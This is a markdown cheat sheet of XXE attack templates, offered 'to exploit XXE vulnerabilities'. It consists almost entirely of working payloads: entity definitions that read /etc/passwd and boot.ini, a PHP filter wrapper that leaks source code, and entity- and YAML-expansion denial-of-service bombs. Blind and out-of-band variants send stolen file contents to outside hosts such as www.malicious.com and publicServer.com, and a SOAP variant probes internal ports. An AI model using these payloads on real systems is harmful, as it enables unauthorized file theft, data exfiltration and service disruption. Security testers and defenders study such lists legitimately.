# XXE Templates

The following are common templates that you can use to exploit XXE vulnerabilities and
easily show the impact of the vulnerability:

Basic test:

    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
        <userInfo>
            <firstName>Juan</firstName>
            <lastName>&example;</lastName>
        </userInfo>

Classic XXE:

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <data>&file;</data>
    <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

Classic XXE Base64 encoded:

    <!DOCTYPE test [ <!ENTITY % init SYSTEM
    "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;
    ]><foo/>

A PHP wrapper inside an XXE:

    <!DOCTYPE replace [<!ENTITY xxe SYSTEM
    "php://filter/convert.base64-encode/resource=index.php"> ]>
        <contacts>
            <contact>
            <name>Jean &xxe; Dupont</name>
            <phone>00 11 22 33 44</phone>
            <adress>42 rue du CTF</adress>
            <zipcode>75000</zipcode>
            <city>Paris</city>
            </contact>
        </contacts>
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "php://filter/convert.base64-
    encode/resource=http://10.0.0.3" >
    ]>
    <foo>&xxe;</foo>

Followed by a DoS:

    <!DOCTYPE data [
    <!ENTITY a0 "dos" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    ]>
    <data>&a4;</data>
    a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
    b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
    c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
    d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
    e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
    f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
    g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
    h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
    i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]

Blind XXE:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
    ]
    >
    <foo>&callhome;</foo>

XXE OOB Attack (Yunusov, 2013):

    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE data SYSTEM
    "http://publicServer.com/parameterEntity_oob.dtd">
    <data>&send;</data>
    File stored on http://publicServer.com/parameterEntity_oob.dtd
    <!ENTITY % file SYSTEM "file:///sys/power/image_size">
    <!ENTITY % all "<!ENTITY send SYSTEM
    'http://publicServer.com/?%file;'>">
    %all;

XXE inside SOAP:

    <soap:Body>
        <foo>
            <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM
            "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
        </foo>
    </soap:Body>


